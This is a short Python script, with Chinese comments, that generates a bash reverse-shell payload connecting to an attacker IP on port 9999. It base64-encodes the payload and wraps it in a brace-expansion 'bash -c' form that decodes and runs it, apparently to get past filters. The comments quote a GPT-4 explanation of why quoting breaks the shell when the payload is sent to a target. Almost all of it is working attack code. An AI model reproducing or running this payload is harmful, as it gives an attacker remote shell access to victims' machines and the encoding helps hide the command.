import base64
Attacker_ip = "1.1.1.1"
payload = f"bash -i >& /dev/tcp/{Attacker_ip}/9999 0>&1"
print(payload.encode("utf-8"))
print(base64.b64encode((payload.encode("utf-8"))))
print(str(base64.b64encode((payload.encode("utf-8")))).strip('b').strip("'"))
#直接在bash中运行需要 bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" 加双引号
#GPT4 解释：
# 当在命令行直接运行这个bash命令时，我们需要在 -c 参数后面的命令字符串用引号（"）包裹起来，
# 是因为这个命令包含了特殊字符（如空格、括号等）。而引号（"）能够确保这个命令被bash作为一个整体来解析和执行。
# 然而，当我们将这个命令作为一个payload发送到目标机器上执行时，就不需要这个引号了。这是因为这个payload已经被当作一个字符串在网络上发送了，
# 目标机器接收到这个payload后，会将其作为一个整体来处理和执行，而不会像命令行一样需要拆解和解析命令中的各个部分。
# 至于为什么在payload中包含引号会导致反弹shell失败，这可能是因为引号在网络传输中被转义，
# 或者目标机器在接收payload时对引号进行了特殊处理，导致bash不能正确解析和执行这个包含引号的payload。
# 总的来说，当你在命令行直接执行bash命令时，需要用引号包裹 -c 参数后的命令；而当你将bash命令作为payload发送时，则不需要这个引号。
payload = 'bash -c "{echo,'+str(base64.b64encode(payload.encode())).strip('b').strip("'")+'}|{base64,-d}|{bash,-i}"'
print(payload)